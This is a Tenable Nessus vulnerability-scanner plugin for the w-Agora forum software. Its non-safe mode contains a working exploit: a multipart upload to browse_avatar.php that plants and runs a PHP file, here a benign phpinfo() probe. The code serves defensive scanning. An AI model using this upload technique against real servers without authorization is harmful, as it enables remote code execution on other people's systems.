#
# (C) Tenable Network Security, Inc.
# 

include("compat.inc");

if (description) {
  script_id(20061);
  script_version("$Revision: 1.10 $");
  script_bugtraq_id(15110);
  script_xref(name:"OSVDB", value:"20058");
  script_xref(name:"OSVDB", value:"20059");
  script_xref(name:"OSVDB", value:"20060");

  script_name(english:"w-Agora <= 4.2.0 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in w-Agora <= 4.2.0");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of w-Agora installed on the remote host fails to validate
files uploaded with the 'browse_avatar.php' and 'insert.php' scripts,
which allows an attacker to upload scripts with arbitrary PHP code and
then to execute it subject to the privileges of the web server user
id.  In addition, it also does not validate the 'site' parameter of
the 'extras/quicklist.php' script before using that to include files,
which can exploited to read arbitrary files if the remote host is
running Windows." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/agora", "/w-agora", "/forum", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  if (safe_checks()) {
    if (report_paranoia > 1) {
      # Get the version number.
      res = http_get_cache(item:string(dir, "/index.php"), port:port);
      if (isnull(res)) exit(0);

      # There's a problem if it's version 4.2.0 or less.
      if (egrep(pattern:'<meta name="GENERATOR" Content="w-agora version ([0-3]\\.|4\\.([01]|2\\.0))', string:res)) {
        report = string(
          "\n",
          "Nessus has determined the vulnerability exists on the remote\n",
          "host simply by looking at the version number of w-Agora\n",
          "installed there."
        );
        security_hole(port:port, extra:report);
        exit(0);
      }
    }
  }
  else {
    # Make sure one of the affected scripts exists.
    r = http_send_recv3(method:"GET",item:string(dir, "/browse_avatar.php"), port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # If it does and allows uploads...
    if ('<input name="avatar" type="file">' >< res) {
      # Try to exploit the flaw.
      avatar = string(rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_"), ".php");
      bound = "bound";
      boundary = string("--", bound);
      postdata = string(
        boundary, "\r\n", 
        'Content-Disposition: form-data; name="site"', "\r\n",
        "\r\n",
        "agora\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="submitted"', "\r\n",
        "\r\n",
        "true\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="perpage"', "\r\n",
        "\r\n",
        "20\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="first"', "\r\n",
        "\r\n",
        "0\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="avatar"; filename="', avatar, '"', "\r\n",
        "Content-Type: application/octet-stream\r\n",
        "\r\n",
        # nb: this is the actual exploit code; you could put pretty much
        #     anything you want here.
        "<?php phpinfo() ?>\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="submit"', "\r\n",
        "\r\n",
        "Copy+file\r\n",

        boundary, "--", "\r\n"
      );
      r = http_send_recv3(method:"POST", item: dir+"/browse_avatar.php",
      	port: port, content_type: "multipart/form-data; boundary="+bound,
	data: postdata);
      if (isnull(r)) exit(0);
      res = r[2];

      # Try to run our "avatar".
      r = http_send_recv3(method:"GET", port: port,
        item:string(dir, "/images/avatars/", avatar));
      if (isnull(r)) exit(0);
      res = r[2];

      # There's a problem if it looks like the output of phpinfo().
      if ("PHP Version" >< res) {
        report = string(
          "\n",
          "Nessus has successfully exploited this vulnerability by uploading a\n",
          "file with PHP code that reveals information about the PHP configuration\n",
          "on the remote host. The file is located under the web server's\n",
          "document directory as:\n",
          "\n",
          "         ", dir, "/images/avatars/", avatar, "\n",
          "\n",
          "You are strongly encouraged to delete this attachment as soon as\n",
          "possible as it can be run by anyone who accesses it remotely.\n"
        );

        security_hole(port:port, extra:report);
        exit(0);
      }
    }
  }
}
